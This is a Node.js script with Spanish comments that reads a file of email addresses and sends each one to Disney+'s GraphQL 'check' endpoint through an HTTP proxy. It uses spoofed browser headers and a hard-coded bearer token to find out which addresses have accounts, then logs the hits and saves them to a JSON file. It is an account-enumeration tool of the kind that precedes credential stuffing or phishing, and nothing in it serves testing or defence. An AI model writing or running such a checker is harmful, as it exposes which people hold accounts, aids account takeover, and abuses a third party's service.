import fs from "fs";
import { HttpsProxyAgent } from "https-proxy-agent";


// Leer emails desde archivo txt
function leerEmailsDesdeArchivo(ruta) {
    try {
        const contenido = fs.readFileSync(ruta, "utf8");
        // Filtrar líneas vacías y espacios
        return contenido.split("\n").map(line => line.trim()).filter(line => line.length > 0);
    } catch (error) {
        console.error("❌ Error leyendo archivo de emails:", error.message);
        return [];
    }
}

// Cargar emails desde el archivo
const emailsALeer = leerEmailsDesdeArchivo("./emails2.txt");

if (emailsALeer.length === 0) {
    console.log("No se encontraron emails para procesar. Asegúrate de crear el archivo 'emails.txt' con un email por línea.");
    process.exit(1);
}

console.log(`Se encontraron ${emailsALeer.length} emails para procesar.\n`);

var TOKEN = "Bearer eyJ6aXAiOiJERUYiLCJraWQiOiJ0Vy10M2ZQUTJEN2Q0YlBWTU1rSkd4dkJlZ0ZXQkdXek5KcFFtOGRJMWYwIiwiY3R5IjoiSldUIiwiZW5jIjoiQzIwUCIsImFsZyI6ImRpciJ9..LaH4uiV3iYd1ze2t.hG00wC35ar9hvFMgSA7XJhgXDnhZn4MQF-A9z5TDUyLIZ1nA7hzj_NggYK_ERHLCO-0EVJ2zz9geFDk8nmDTfa0fVZHpTysnavwjs2dAhVLNMoV5AHkKBBiynD308Cle-x2ZMhYuKo4U-5XvR8t9OBhlFbGsvQ7hPoNfzxMpDmru-0zMI51sI9zY-wMEc9AXHBEZ-OHxk-mcbPc_1hCdGaeNjaQladVQwXIrEa-NIQgb-Gb9psBj4xY4tbG2h9eLdsD0Mythel4gl9W8hBzHpvD6i2JAWwkQXEQsjTe98hSMEo6AFHwE84kjCKidUQfH4JRyRna5czWGrfn6d2Cn12Hs1uoqfTFnva-unXxZUDd7wI9Lfx9u8caXZcytwa3uk1oZ6TP_9iV8mp6MLFt0c0qygK7YeYMZGJbExOXDhK_YLmI1uBdMErx_tfLmXp5ZKNKNCTI9s5zkaVyU9mrthrzq4vmHxwuGWI6COQOozYX0c9xiUM2khuVuDKT88sUb77aqPiew5zYft8sMqA6FbjwESbx7F3h8ncbUfUYQWZ0V26yIcH0myM30HHBW-ip6thHbUm3B6AU_mpQHPEFfbqq6qB7nxzZpUgcFBOanlmQcw7yoU3zjEWfBvA8yHoKu1fmHMd2_UKoR7vxx06quiLAYPBE7SsNCTIcsb2mvRKxpCUqQ-s8MuwbhvLYa3gtLM4OgQpEJe4ZNks7u7Pu44kN-TLuHZXXwKi2cX7HLYhMGt7BUUDd5GZIDk5f69oEylv1wRN1IbWc7TilGzNCZ8pky1dwbPx11YZfzadh3JVNdaFu9gjmJ5gBt0kVFIUjM-IxwYG_KUKumXgXWE6fyjxWEss40RITcLVB3hMb29tJR8QL_Vt0cf9WO-CQ57-bUP4sWALlHqQdFVysODkBmIbVzQgEnLZPObifw1FwLXXdLr7dKmCQqeFSdKxFt521kKQ6YTFG2sRqeQWF1xtVNf835kmdJe3BaB-X1MH_U85LaO9llJhTagY6s75TmB4vWtOivXuV5eFDPdiGkRRiq-wxSHiGgmNZ50EmDE0PjQ71rIRn8QUQks4Sec0n_szRyG85lt9MXcStWfSscL1JeDFW9bxDlxybh57LC0KMCx7O3AIWO2cdwkpJPLbR7dq2T3gG9nJI5QKh-zmKqW-SkG7RRtThQM1FF9Yzi7OqFZawOcPLKUlVefaJBX8ATACuOE96BP6r3y4IKlAk-a3UKEXOYfG7zctEb5NQbQLWvgktgC9z49Se5nzc1xR4R4Gjvte52yy7ykuJ_fkZ9T7-4h0qm04YBoTM53-cucdiKR0L1W3PyoHg2riilCa9DZU0fYMdI4l1i1xwjtSun3447b_oWQ-oCxSpO_DIguIyCeDi1RrMtEUtRBvhqQ1nH1g3z1CQSeLkrLOn1GC73BHaMTINLKJFrSSxi73zoo4KbJYqg7CDWcuBdi50Ri_B5PtrxhF-1VxAKj_tYZW-xkjUV8zNC4lVsHnxrS7_1n_vnF13BLWtTjXQp-L_hj2H1hyMYYrQZZC18KGJHBPzhQ09j5EgzpZ_du_pfyuG-FonPGGAPXq-1T4UCyJ-s9slu0oKanPSi_Vb86oCGrzgY1iEHMzGhjjLmPeiAo1D-7m_2cAi2KfBQObutj0MjNr635oXrIYWvfereppkSOv4DFK1g212veFoLCvNyuVPtasRYRUbAklu0tLqBSWQhSEw33v_-oEBaQCDEZ5oY5HJhlZc8otM14UaiAC9tqJNn-jKaku7BgFkph7xoTuOz_k9_Vg2S4_MSwH4oMKnkhWTetuTiPOErJhru00RY3e_jdWKg4t4-yHEbJFu4MiaihuZ5QBu9ytraXfKnub4oExwq0_-exz2UPVWkOO3JdlDZbpM2I1hnKZB2Jm0yOsxOQK0X4lWvKqnQ9-XKxJvtjQEDHdm8IqaHRG2C9oOVc47dlUgtQM_akdAN4EZX4nGTNVfwyIkaQiX7FHb-7RvsqlrmA0EuvjVmg_4RIJlJRj_1UcJ2YbsXYTPJMFxZsjUy0_axiZi64nVUqziNbSid6IBWbWn8rvMcHWGIfNO1Zh2ivnJLAOQabDJixgB1DjhYi-GbDgOZWqiC_v0spIAM2LYVzYqMDIZElnAlFkqFLcqSueViGzK-gyu4B3ukPiKRHcP_8woyqaN6jBr4MyYEmK_RTiDAHzb2X8yfYi_yca7e8VRXaaLvRtslRDu_JLebYMo5R0JSt9sG2PicFOm-HsS5ehztDo9h492vfJsK-1hT_ATb5LbBTBGQ-dIP0p2qod-ptnDHR8-qOSu4OGE-kiZ4NpWNV5NbkiZwo6i-mfvT2HFLtAIEnqOemb_NLlNVBKb-og0Dl6NaA0hVx2W8qtHsl9JoZHi0biRLZwfje-zF0BP1FdjwmbUDPRrbNrdgrLL8eB-TYA6OkSWB1v7f2A8BpTFcZcbrquCVDVToC6RxOBP0id3uA_0VG9JfkyMhXbv1olM2QP7XPo2MQ9b9Qj8dH28m-20L0cnHynYGhNeM8PhDfVLECJHyV9PoqZi2ISj_muUs8mUpsEMpjevyRm_xBU1B6llKK1J3exLXXgXvv0NvIAdpFxEBXg-QR_V-9Dhkl-4L31lpmDEA3ZEuOtABogMSDEZUibvOzupiaOLa5WRns7X4gRUJfmlW38uLWoA.NFCx0LTvviWlUYM7T-YKwQ"


const rutaArchivo = "./resultados.json";
fs.writeFileSync(rutaArchivo, "[]", "utf8");

function cargarJSON() {
    try {
        const data = fs.readFileSync(rutaArchivo, "utf8");
        return JSON.parse(data);
    } catch {
        return [];
    }
}

function guardarResultado(email, result) {
    const datos = cargarJSON();
    datos.push({
        email,
        exist: result.exist,
        noError: result.noError,
        errorMessage: result.errorMessage || null
    });
    fs.writeFileSync(rutaArchivo, JSON.stringify(datos, null, 2), "utf8");
}

// Procesar cada email del archivo
/* for (let i = 532; i >= 0; i--) { */
for (let i = 0; i < emailsALeer.length ; i++) {
    const correoFormado = emailsALeer[i];
    //console.log(correoFormado)
    if (!correoFormado.includes('@')) {
        console.log(`⚠️ Línea ${i + 1} no es un email válido: ${correoFormado}`);
        continue;
    }

    /* const proxy = "http://8.35.211.163:80";
    const agent = new HttpsProxyAgent(proxy);

    const res = await fetch("https://ipinfo.io/json", {
        agent,
        headers: {
            "User-Agent": "Mozilla/5.0"
        }
    });

    console.log(await res.json());

    break */

    var result = await checkDisneyExists(correoFormado);
    guardarResultado(correoFormado, result);

    if (result.noError) {
        if (result.exist === true) {
            console.log(correoFormado + " PERRO existeeeeeeeeeeeeeeeeeeee")
        }
        /* if (result.exist === false) {
            console.log((i + 1) + " no existe")
        } */
    }

    if (result.noError === false) {
        if (result.serverError) {
            console.error("🖥🖥🖥🖥 Error servidor: " + result.errorMessage)
        } else {
            console.log("🌐🌐🌐🌐 Error solicitud: " + result.errorMessage);
        }
    }
}

async function checkDisneyExists(email) {
    var result = {
        noError: false,
        exist: null,
        serverError: false,
        errorMessage: ""
    }

    try {

        const proxy = "http://192.168.148.68:46704";
        const agent = new HttpsProxyAgent(proxy);

        var serverResponse = await fetch("https://disney.api.edge.bamgrid.com/v1/public/graphql ", {
            "headers": {
                "accept": "application/json",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "priority": "u=1, i",
                "sec-ch-ua": "\"Chromium\";v=\"142\", \"Google Chrome\";v=\"142\", \"Not_A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "cross-site",
                "x-application-version": "1.1.2",
                "x-bamsdk-client-id": "disney-svod-3d9324fc",
                "x-bamsdk-platform": "javascript/windows/chrome",
                "x-bamsdk-platform-id": "browser",
                "x-bamsdk-version": "34.1",
                "x-dss-edge-accept": "vnd.dss.edge+json; version=2",
                "x-request-id": "07f43d86-8b1e-4276-a724-4ca71801239d",
                "x-request-yp-id": "624b805dafc5c73635b1a216",
                "Referer": "https://www.disneyplus.com/ ",
                "authorization": TOKEN,
            },
            agent,
            "body": "{\"query\":\"\\n    query check($email: String!) {\\n        check(email: $email) {\\n            operations\\n            nextOperation\\n        }\\n    }\\n\",\"variables\":{\"email\":\"" + email + "\"},\"operationName\":\"check\"}",
            "method": "POST"
        })

        var jsonResponse = await serverResponse.json();
        if (jsonResponse.hasOwnProperty("errors")) {
            result.serverError = true;
            throw new Error(jsonResponse.errors[0].code);
        }

        if (jsonResponse.hasOwnProperty("data")) {
            if (jsonResponse.data.hasOwnProperty("check")) {
                if (jsonResponse.data.check.hasOwnProperty("operations")) {
                    if (jsonResponse.data.check.operations.includes("Login") || jsonResponse.data.check.operations.includes("OTP")) {
                        result.exist = true;
                        result.noError = true;
                        if (jsonResponse.data.check.operations.includes("Login")) {
                            result.login = true
                            console.log("LOGIN")
                        } else {
                            result.login = false
                        }
                    }
                    if (jsonResponse.data.check.operations.includes("Register")) {
                        result.exist = false;
                        result.noError = true;
                    }
                }
            }
        }
        if (result.exist === null) {
            throw new Error("No se pudo determinar si existe")
        }

    } catch (error) {
        result.errorMessage = error.message;
        result.noError = false;
    } finally {
        return result
    }
}